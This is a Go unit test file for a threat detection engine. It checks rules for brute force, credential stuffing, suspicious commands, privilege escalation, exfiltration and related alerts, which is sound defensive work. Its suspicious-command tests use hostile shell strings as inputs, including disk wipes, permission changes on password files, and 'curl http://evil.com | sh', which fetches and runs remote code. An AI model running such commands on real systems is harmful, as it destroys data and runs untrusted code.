package threat

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"sync"
	"testing"
	"time"
)

// helper to create a detector with short suppression for tests.
func testDetector() *Detector {
	return NewDetector(&DetectorConfig{
		Enabled:           true,
		SuppressionWindow: 50 * time.Millisecond,
		MaxAlertsPerRule:  100,
		BusinessHourStart: 6,
		BusinessHourEnd:   22,
	})
}

// --- Brute Force Detection ---

func TestBruteForceDetection(t *testing.T) {
	d := testDetector()
	now := time.Now()

	// Send 10 auth failures (at threshold — no alert yet).
	for i := 0; i < 10; i++ {
		alerts := d.ProcessEvent(&Event{
			Timestamp: now.Add(time.Duration(i) * time.Second),
			Type:      "auth_failure",
			Username:  "user1",
			SourceIP:  "10.0.0.1",
		})
		if len(alerts) > 0 {
			t.Fatalf("unexpected alert at event %d", i+1)
		}
	}

	// 11th auth failure should trigger the alert.
	alerts := d.ProcessEvent(&Event{
		Timestamp: now.Add(11 * time.Second),
		Type:      "auth_failure",
		Username:  "user1",
		SourceIP:  "10.0.0.1",
	})
	if len(alerts) == 0 {
		t.Fatal("expected brute force alert")
	}
	if alerts[0].RuleID != "brute_force" {
		t.Fatalf("expected brute_force rule, got %s", alerts[0].RuleID)
	}
	if alerts[0].Severity != SeverityHigh {
		t.Fatalf("expected high severity, got %s", alerts[0].Severity)
	}
}

func TestBruteForceWindowExpiry(t *testing.T) {
	d := testDetector()
	now := time.Now()

	// Send 10 events in the past (outside the 5-minute window).
	for i := 0; i < 10; i++ {
		d.ProcessEvent(&Event{
			Timestamp: now.Add(-10 * time.Minute).Add(time.Duration(i) * time.Second),
			Type:      "auth_failure",
			Username:  "user1",
			SourceIP:  "10.0.0.2",
		})
	}

	// This event is current but only 1 event in the window — no alert.
	alerts := d.ProcessEvent(&Event{
		Timestamp: now,
		Type:      "auth_failure",
		Username:  "user1",
		SourceIP:  "10.0.0.2",
	})
	for _, a := range alerts {
		if a.RuleID == "brute_force" {
			t.Fatal("should not trigger brute force for events outside the window")
		}
	}
}

// --- Credential Stuffing Detection ---

func TestCredentialStuffingDetection(t *testing.T) {
	d := testDetector()
	now := time.Now()

	// 6 different users failing from the same IP → should trigger.
	for i := 0; i < 6; i++ {
		d.ProcessEvent(&Event{
			Timestamp: now.Add(time.Duration(i) * time.Second),
			Type:      "auth_failure",
			Username:  fmt.Sprintf("user%d", i),
			SourceIP:  "10.0.0.5",
		})
	}

	alerts := d.GetAlerts(AlertFilter{RuleID: "credential_stuffing"})
	if len(alerts) == 0 {
		t.Fatal("expected credential stuffing alert")
	}
	if alerts[0].Severity != SeverityHigh {
		t.Fatalf("expected high severity, got %s", alerts[0].Severity)
	}
}

func TestCredentialStuffingSameUser(t *testing.T) {
	d := testDetector()
	now := time.Now()

	// Same user failing 6 times should NOT trigger credential stuffing (only 1 unique user).
	for i := 0; i < 6; i++ {
		d.ProcessEvent(&Event{
			Timestamp: now.Add(time.Duration(i) * time.Second),
			Type:      "auth_failure",
			Username:  "sameuser",
			SourceIP:  "10.0.0.6",
		})
	}

	alerts := d.GetAlerts(AlertFilter{RuleID: "credential_stuffing"})
	if len(alerts) > 0 {
		t.Fatal("credential stuffing should not fire for a single user")
	}
}

// --- Suspicious Command Detection ---

func TestSuspiciousCommandDetection(t *testing.T) {
	commands := []string{
		"rm -rf /",
		"chmod 777 /etc/passwd",
		"wget http://evil.com/shell.sh",
		"curl http://x.y | sh",
		"dd if=/dev/zero of=/dev/sda",
	}
	for _, cmd := range commands {
		d := testDetector()
		alerts := d.ProcessEvent(&Event{
			Timestamp: time.Now(),
			Type:      "command",
			Username:  "admin",
			SourceIP:  "10.0.0.1",
			Details:   map[string]interface{}{"command": cmd},
		})
		found := false
		for _, a := range alerts {
			if a.RuleID == "suspicious_command" {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected suspicious_command alert for %q", cmd)
		}
	}
}

func TestSafeCommandNoAlert(t *testing.T) {
	d := testDetector()
	alerts := d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "command",
		Username:  "admin",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "ls -la"},
	})
	for _, a := range alerts {
		if a.RuleID == "suspicious_command" {
			t.Fatal("safe command should not trigger alert")
		}
	}
}

// --- Privilege Escalation Detection ---

func TestPrivilegeEscalationDetection(t *testing.T) {
	commands := []string{"sudo rm -rf /home/test", "su root", "passwd"}
	for _, cmd := range commands {
		d := testDetector()
		alerts := d.ProcessEvent(&Event{
			Timestamp: time.Now(),
			Type:      "command",
			Username:  "user1",
			SourceIP:  "10.0.0.1",
			Details:   map[string]interface{}{"command": cmd},
		})
		found := false
		for _, a := range alerts {
			if a.RuleID == "privilege_escalation" {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected privilege_escalation alert for %q", cmd)
		}
	}
}

// --- Off-Hours Access ---

func TestOffHoursAccessDetection(t *testing.T) {
	d := testDetector()
	// 3 AM UTC is outside business hours (6-22).
	offHour := time.Date(2025, 1, 15, 3, 0, 0, 0, time.UTC)
	alerts := d.ProcessEvent(&Event{
		Timestamp: offHour,
		Type:      "auth_success",
		Username:  "user1",
		SourceIP:  "10.0.0.1",
	})
	found := false
	for _, a := range alerts {
		if a.RuleID == "off_hours_access" {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("expected off_hours_access alert at 03:00 UTC")
	}
}

func TestBusinessHoursNoAlert(t *testing.T) {
	d := testDetector()
	// 10 AM UTC is within business hours.
	onHour := time.Date(2025, 1, 15, 10, 0, 0, 0, time.UTC)
	alerts := d.ProcessEvent(&Event{
		Timestamp: onHour,
		Type:      "auth_success",
		Username:  "user1",
		SourceIP:  "10.0.0.1",
	})
	for _, a := range alerts {
		if a.RuleID == "off_hours_access" {
			t.Fatal("should not alert during business hours")
		}
	}
}

// --- Impossible Travel ---

func TestImpossibleTravelDetection(t *testing.T) {
	d := testDetector()
	now := time.Now()

	// Connection from one IP range.
	d.ProcessEvent(&Event{
		Timestamp: now.Add(-5 * time.Minute),
		Type:      "auth_success",
		Username:  "traveler",
		SourceIP:  "10.0.0.1",
	})

	// Connection from a very different IP range.
	alerts := d.ProcessEvent(&Event{
		Timestamp: now,
		Type:      "auth_success",
		Username:  "traveler",
		SourceIP:  "192.168.1.1",
	})
	found := false
	for _, a := range alerts {
		if a.RuleID == "impossible_travel" {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("expected impossible_travel alert")
	}
}

func TestSameSubnetNoImpossibleTravel(t *testing.T) {
	d := testDetector()
	now := time.Now()

	d.ProcessEvent(&Event{
		Timestamp: now.Add(-5 * time.Minute),
		Type:      "auth_success",
		Username:  "local",
		SourceIP:  "10.0.1.1",
	})

	alerts := d.ProcessEvent(&Event{
		Timestamp: now,
		Type:      "auth_success",
		Username:  "local",
		SourceIP:  "10.0.2.2",
	})
	for _, a := range alerts {
		if a.RuleID == "impossible_travel" {
			t.Fatal("same /16 should not trigger impossible travel")
		}
	}
}

// --- Data Exfiltration ---

func TestDataExfiltrationDetection(t *testing.T) {
	d := testDetector()
	alerts := d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "data_transfer",
		Username:  "user1",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"bytes_transferred": 200 * 1024 * 1024}, // 200 MB
	})
	found := false
	for _, a := range alerts {
		if a.RuleID == "data_exfiltration" {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("expected data_exfiltration alert")
	}
}

func TestSmallTransferNoAlert(t *testing.T) {
	d := testDetector()
	alerts := d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "data_transfer",
		Username:  "user1",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"bytes_transferred": 50 * 1024 * 1024}, // 50 MB
	})
	for _, a := range alerts {
		if a.RuleID == "data_exfiltration" {
			t.Fatal("small transfer should not trigger alert")
		}
	}
}

// --- Lateral Movement ---

func TestLateralMovementDetection(t *testing.T) {
	d := testDetector()
	now := time.Now()

	targets := []string{"host-a.internal", "host-b.internal", "host-c.internal"}
	var lastAlerts []*Alert
	for i, target := range targets {
		// Use tiny sleep to avoid suppression.
		time.Sleep(60 * time.Millisecond)
		lastAlerts = d.ProcessEvent(&Event{
			Timestamp: now.Add(time.Duration(i) * time.Second),
			Type:      "connection",
			Username:  "lateral",
			SourceIP:  "10.0.0.1",
			Target:    target,
		})
	}
	found := false
	for _, a := range lastAlerts {
		if a.RuleID == "lateral_movement" {
			found = true
			break
		}
	}
	if !found {
		// Check all alerts.
		all := d.GetAlerts(AlertFilter{RuleID: "lateral_movement"})
		if len(all) == 0 {
			t.Fatal("expected lateral_movement alert")
		}
	}
}

// --- Account Compromise ---

func TestAccountCompromiseDetection(t *testing.T) {
	d := testDetector()
	now := time.Now()

	// Sequence: auth_failure → auth_success → command.
	d.ProcessEvent(&Event{
		Timestamp: now,
		Type:      "auth_failure",
		Username:  "victim",
		SourceIP:  "10.0.0.1",
	})
	d.ProcessEvent(&Event{
		Timestamp: now.Add(1 * time.Second),
		Type:      "auth_success",
		Username:  "victim",
		SourceIP:  "10.0.0.1",
	})
	time.Sleep(60 * time.Millisecond) // avoid suppression
	alerts := d.ProcessEvent(&Event{
		Timestamp: now.Add(2 * time.Second),
		Type:      "command",
		Username:  "victim",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "ls"},
	})
	found := false
	for _, a := range alerts {
		if a.RuleID == "account_compromise" {
			found = true
			if a.Severity != SeverityCritical {
				t.Fatalf("expected critical severity, got %s", a.Severity)
			}
			break
		}
	}
	if !found {
		all := d.GetAlerts(AlertFilter{RuleID: "account_compromise"})
		if len(all) == 0 {
			t.Fatal("expected account_compromise alert")
		}
	}
}

// --- Session Anomaly ---

func TestSessionAnomalyDetection(t *testing.T) {
	d := testDetector()
	alerts := d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "session_end",
		Username:  "user1",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"duration": float64(36000)}, // 10 hours
	})
	found := false
	for _, a := range alerts {
		if a.RuleID == "session_anomaly" {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("expected session_anomaly alert")
	}
}

func TestShortSessionNoAnomaly(t *testing.T) {
	d := testDetector()
	alerts := d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "session_end",
		Username:  "user1",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"duration": float64(3600)}, // 1 hour
	})
	for _, a := range alerts {
		if a.RuleID == "session_anomaly" {
			t.Fatal("short session should not trigger anomaly")
		}
	}
}

// --- Alert Lifecycle ---

func TestAlertLifecycle(t *testing.T) {
	d := testDetector()
	now := time.Now()

	// Generate a brute force alert.
	for i := 0; i < 12; i++ {
		d.ProcessEvent(&Event{
			Timestamp: now.Add(time.Duration(i) * time.Second),
			Type:      "auth_failure",
			Username:  "user1",
			SourceIP:  "10.0.0.50",
		})
	}

	alerts := d.GetAlerts(AlertFilter{RuleID: "brute_force"})
	if len(alerts) == 0 {
		t.Fatal("expected at least one alert")
	}

	alertID := alerts[0].ID
	if alerts[0].Status != AlertActive {
		t.Fatalf("expected active status, got %s", alerts[0].Status)
	}

	// Acknowledge.
	if err := d.AcknowledgeAlert(alertID, "admin"); err != nil {
		t.Fatal(err)
	}
	a, _ := d.GetAlert(alertID)
	if a.Status != AlertAcknowledged {
		t.Fatalf("expected acknowledged, got %s", a.Status)
	}
	if a.AckedBy != "admin" {
		t.Fatalf("expected acked_by admin, got %s", a.AckedBy)
	}

	// Resolve.
	if err := d.ResolveAlert(alertID, "admin"); err != nil {
		t.Fatal(err)
	}
	a, _ = d.GetAlert(alertID)
	if a.Status != AlertResolved {
		t.Fatalf("expected resolved, got %s", a.Status)
	}
}

func TestAlertFalsePositive(t *testing.T) {
	d := testDetector()

	// Generate alert via suspicious command.
	alerts := d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "command",
		Username:  "admin",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "rm -rf /tmp/old"},
	})
	if len(alerts) == 0 {
		t.Fatal("expected alert")
	}

	if err := d.MarkFalsePositive(alerts[0].ID, "security_team"); err != nil {
		t.Fatal(err)
	}
	a, _ := d.GetAlert(alerts[0].ID)
	if a.Status != AlertFalsePositive {
		t.Fatalf("expected false_positive, got %s", a.Status)
	}
}

func TestAlertNotFound(t *testing.T) {
	d := testDetector()
	_, err := d.GetAlert("nonexistent")
	if err == nil {
		t.Fatal("expected error for nonexistent alert")
	}
	if err2 := d.AcknowledgeAlert("nonexistent", "admin"); err2 == nil {
		t.Fatal("expected error for nonexistent alert")
	}
}

// --- Multiple Rules from Same Event ---

func TestMultipleRulesTrigger(t *testing.T) {
	d := testDetector()
	// A command event at 3 AM that matches suspicious_command AND privilege_escalation AND off_hours.
	offHour := time.Date(2025, 1, 15, 3, 0, 0, 0, time.UTC)
	alerts := d.ProcessEvent(&Event{
		Timestamp: offHour,
		Type:      "command",
		Username:  "admin",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "sudo rm -rf /var/log"},
	})
	ruleIDs := make(map[string]bool)
	for _, a := range alerts {
		ruleIDs[a.RuleID] = true
	}
	if !ruleIDs["suspicious_command"] {
		t.Error("expected suspicious_command alert")
	}
	if !ruleIDs["privilege_escalation"] {
		t.Error("expected privilege_escalation alert")
	}
}

// --- Rule Enable/Disable ---

func TestRuleDisable(t *testing.T) {
	d := testDetector()
	enabled := false
	if err := d.UpdateRule("suspicious_command", &enabled, nil, nil, nil); err != nil {
		t.Fatal(err)
	}

	alerts := d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "command",
		Username:  "admin",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "rm -rf /"},
	})
	for _, a := range alerts {
		if a.RuleID == "suspicious_command" {
			t.Fatal("disabled rule should not fire")
		}
	}
}

func TestRuleEnable(t *testing.T) {
	d := testDetector()
	// Disable then re-enable.
	f := false
	d.UpdateRule("suspicious_command", &f, nil, nil, nil)
	tr := true
	d.UpdateRule("suspicious_command", &tr, nil, nil, nil)

	alerts := d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "command",
		Username:  "admin",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "rm -rf /"},
	})
	found := false
	for _, a := range alerts {
		if a.RuleID == "suspicious_command" {
			found = true
		}
	}
	if !found {
		t.Fatal("re-enabled rule should fire")
	}
}

func TestUpdateRuleNotFound(t *testing.T) {
	d := testDetector()
	if err := d.UpdateRule("nonexistent", nil, nil, nil, nil); err == nil {
		t.Fatal("expected error for nonexistent rule")
	}
}

// --- Concurrent Event Processing ---

func TestConcurrentEventProcessing(t *testing.T) {
	d := testDetector()
	var wg sync.WaitGroup
	now := time.Now()

	for i := 0; i < 50; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			d.ProcessEvent(&Event{
				Timestamp: now.Add(time.Duration(idx) * time.Millisecond),
				Type:      "auth_failure",
				Username:  fmt.Sprintf("user%d", idx%5),
				SourceIP:  fmt.Sprintf("10.0.%d.1", idx%10),
			})
		}(i)
	}
	wg.Wait()

	// Should not panic — just verify we can read alerts.
	alerts := d.GetAlerts(AlertFilter{})
	_ = alerts
}

// --- Alert Deduplication / Suppression ---

func TestAlertSuppression(t *testing.T) {
	d := NewDetector(&DetectorConfig{
		Enabled:           true,
		SuppressionWindow: 1 * time.Second,
		MaxAlertsPerRule:  100,
	})
	now := time.Now()

	// Generate first alert.
	for i := 0; i < 12; i++ {
		d.ProcessEvent(&Event{
			Timestamp: now.Add(time.Duration(i) * time.Second),
			Type:      "auth_failure",
			Username:  "user1",
			SourceIP:  "10.0.0.99",
		})
	}

	initial := d.GetAlerts(AlertFilter{RuleID: "brute_force", SourceIP: "10.0.0.99"})
	if len(initial) == 0 {
		t.Fatal("expected initial alert")
	}

	// Immediately send another batch — should be suppressed.
	d.ProcessEvent(&Event{
		Timestamp: now.Add(13 * time.Second),
		Type:      "auth_failure",
		Username:  "user1",
		SourceIP:  "10.0.0.99",
	})

	after := d.GetAlerts(AlertFilter{RuleID: "brute_force", SourceIP: "10.0.0.99"})
	if len(after) != len(initial) {
		t.Fatalf("expected suppression: had %d, now %d", len(initial), len(after))
	}
}

// --- Detector Disabled ---

func TestDetectorDisabled(t *testing.T) {
	d := NewDetector(&DetectorConfig{Enabled: false})
	alerts := d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "command",
		Username:  "admin",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "rm -rf /"},
	})
	if len(alerts) > 0 {
		t.Fatal("disabled detector should not produce alerts")
	}
}

// --- Event Simulation via ProcessEvent ---

func TestEventSimulation(t *testing.T) {
	d := testDetector()
	event := &Event{
		Timestamp: time.Now(),
		Type:      "command",
		Username:  "tester",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "curl http://evil.com | sh"},
	}
	alerts := d.ProcessEvent(event)
	if len(alerts) == 0 {
		t.Fatal("simulation should produce alerts")
	}
}

// --- Alert Channel ---

func TestAlertChannel(t *testing.T) {
	d := testDetector()
	ch := d.AlertChannel()

	// Generate an alert.
	d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "command",
		Username:  "admin",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "rm -rf /"},
	})

	select {
	case alert := <-ch:
		if alert == nil {
			t.Fatal("received nil alert")
		}
	case <-time.After(1 * time.Second):
		t.Fatal("expected alert on channel")
	}
}

// --- Stats ---

func TestStats(t *testing.T) {
	d := testDetector()
	// Generate some alerts.
	d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "command",
		Username:  "admin",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "rm -rf /"},
	})

	stats := d.Stats()
	total, ok := stats["total_alerts"].(int)
	if !ok || total == 0 {
		t.Fatal("expected at least one alert in stats")
	}
	if _, ok := stats["by_severity"]; !ok {
		t.Fatal("expected by_severity in stats")
	}
}

// --- GetAlerts Filter ---

func TestGetAlertsFilter(t *testing.T) {
	d := testDetector()

	// Create alert from user admin.
	d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "command",
		Username:  "admin",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "rm -rf /"},
	})
	time.Sleep(60 * time.Millisecond)
	// Create alert from user dev.
	d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "command",
		Username:  "dev",
		SourceIP:  "10.0.0.2",
		Details:   map[string]interface{}{"command": "chmod 777 /etc/shadow"},
	})

	adminAlerts := d.GetAlerts(AlertFilter{Username: "admin"})
	devAlerts := d.GetAlerts(AlertFilter{Username: "dev"})

	if len(adminAlerts) == 0 {
		t.Fatal("expected alerts for admin")
	}
	if len(devAlerts) == 0 {
		t.Fatal("expected alerts for dev")
	}
	// Filtering by IP.
	ipAlerts := d.GetAlerts(AlertFilter{SourceIP: "10.0.0.1"})
	if len(ipAlerts) == 0 {
		t.Fatal("expected alerts for IP 10.0.0.1")
	}
}

// --- Start / Stop ---

func TestStartStop(t *testing.T) {
	d := testDetector()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	if err := d.Start(ctx); err != nil {
		t.Fatal(err)
	}
	if err := d.Stop(); err != nil {
		t.Fatal(err)
	}
}

// --- Behavior Tracker ---

func TestBehaviorTrackerCleanup(t *testing.T) {
	bt := newBehaviorTracker(1000)
	now := time.Now()

	bt.Add(trackedEvent{Timestamp: now.Add(-2 * time.Hour), Type: "old"})
	bt.Add(trackedEvent{Timestamp: now, Type: "new"})

	bt.Cleanup(1 * time.Hour)

	events := bt.EventsInWindow(3 * time.Hour)
	if len(events) != 1 {
		t.Fatalf("expected 1 event after cleanup, got %d", len(events))
	}
}

func TestBehaviorTrackerMaxEvents(t *testing.T) {
	bt := newBehaviorTracker(10)
	for i := 0; i < 20; i++ {
		bt.Add(trackedEvent{
			Timestamp: time.Now(),
			Type:      fmt.Sprintf("event_%d", i),
		})
	}
	bt.mu.Lock()
	count := len(bt.events)
	bt.mu.Unlock()
	if count > 10 {
		t.Fatalf("tracker should cap at maxEvents, got %d", count)
	}
}

// --- Threshold window expiry ---

func TestThresholdWindowExpiry(t *testing.T) {
	d := testDetector()
	now := time.Now()

	// 8 events old, 3 recent — total 11 but only 3 in window.
	for i := 0; i < 8; i++ {
		d.ProcessEvent(&Event{
			Timestamp: now.Add(-6 * time.Minute),
			Type:      "auth_failure",
			Username:  "user1",
			SourceIP:  "10.0.0.77",
		})
	}
	for i := 0; i < 3; i++ {
		alerts := d.ProcessEvent(&Event{
			Timestamp: now.Add(time.Duration(i) * time.Second),
			Type:      "auth_failure",
			Username:  "user1",
			SourceIP:  "10.0.0.77",
		})
		for _, a := range alerts {
			if a.RuleID == "brute_force" {
				t.Fatal("should not trigger with only 3 events in window")
			}
		}
	}
}

// --- Default Rules ---

func TestDefaultRulesCount(t *testing.T) {
	rules := DefaultRules()
	if len(rules) != 10 {
		t.Fatalf("expected 10 default rules, got %d", len(rules))
	}
}

func TestAllRulesHaveID(t *testing.T) {
	for _, r := range DefaultRules() {
		if r.ID == "" {
			t.Fatal("rule has empty ID")
		}
		if r.Name == "" {
			t.Fatalf("rule %s has empty name", r.ID)
		}
	}
}

// --- API Integration Smoke Test ---

func TestThreatAPISimulate(t *testing.T) {
	d := testDetector()
	mux := http.NewServeMux()

	// Minimal API-like handler for simulate.
	mux.HandleFunc("POST /api/v2/threats/simulate", func(w http.ResponseWriter, r *http.Request) {
		var event Event
		if err := json.NewDecoder(r.Body).Decode(&event); err != nil {
			http.Error(w, err.Error(), 400)
			return
		}
		if event.Timestamp.IsZero() {
			event.Timestamp = time.Now()
		}
		alerts := d.ProcessEvent(&event)
		result := map[string]interface{}{
			"alerts_generated": len(alerts),
			"alerts":           alerts,
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(result)
	})

	body := `{"type":"command","username":"admin","source_ip":"10.0.0.1","details":{"command":"rm -rf /"}}`
	req := httptest.NewRequest("POST", "/api/v2/threats/simulate", bytes.NewBufferString(body))
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	var resp map[string]interface{}
	json.NewDecoder(w.Body).Decode(&resp)
	count, _ := resp["alerts_generated"].(float64)
	if count == 0 {
		t.Fatal("expected at least one alert from simulation")
	}
}

// --- Sequence detection: incomplete sequence should not trigger ---

func TestIncompleteSequenceNoAlert(t *testing.T) {
	d := testDetector()
	now := time.Now()

	// Only auth_failure and auth_success (missing command) — no account_compromise.
	d.ProcessEvent(&Event{
		Timestamp: now,
		Type:      "auth_failure",
		Username:  "partial",
		SourceIP:  "10.0.0.1",
	})
	alerts := d.ProcessEvent(&Event{
		Timestamp: now.Add(1 * time.Second),
		Type:      "auth_success",
		Username:  "partial",
		SourceIP:  "10.0.0.1",
	})
	for _, a := range alerts {
		if a.RuleID == "account_compromise" {
			t.Fatal("incomplete sequence should not trigger account_compromise")
		}
	}
}

// --- Custom pattern update ---

func TestUpdateRulePattern(t *testing.T) {
	d := testDetector()
	newPattern := `(?i)(custom_bad_cmd)`
	if err := d.UpdateRule("suspicious_command", nil, nil, nil, &newPattern); err != nil {
		t.Fatal(err)
	}

	// Old pattern should no longer match.
	alerts := d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "command",
		Username:  "admin",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "rm -rf /"},
	})
	for _, a := range alerts {
		if a.RuleID == "suspicious_command" {
			t.Fatal("old pattern should not match after update")
		}
	}

	// New pattern should match.
	time.Sleep(60 * time.Millisecond) // avoid suppression
	alerts = d.ProcessEvent(&Event{
		Timestamp: time.Now(),
		Type:      "command",
		Username:  "admin",
		SourceIP:  "10.0.0.1",
		Details:   map[string]interface{}{"command": "custom_bad_cmd foo"},
	})
	found := false
	for _, a := range alerts {
		if a.RuleID == "suspicious_command" {
			found = true
		}
	}
	if !found {
		t.Fatal("new pattern should match")
	}
}

// --- Tracker UniqueValues ---

func TestTrackerUniqueValues(t *testing.T) {
	bt := newBehaviorTracker(100)
	now := time.Now()
	bt.Add(trackedEvent{Timestamp: now, SourceIP: "1.1.1.1", Username: "a"})
	bt.Add(trackedEvent{Timestamp: now, SourceIP: "1.1.1.1", Username: "b"})
	bt.Add(trackedEvent{Timestamp: now, SourceIP: "2.2.2.2", Username: "a"})

	ips := bt.UniqueValuesInWindow("source_ip", time.Minute)
	if len(ips) != 2 {
		t.Fatalf("expected 2 unique IPs, got %d", len(ips))
	}
	users := bt.UniqueValuesInWindow("username", time.Minute)
	if len(users) != 2 {
		t.Fatalf("expected 2 unique users, got %d", len(users))
	}
}
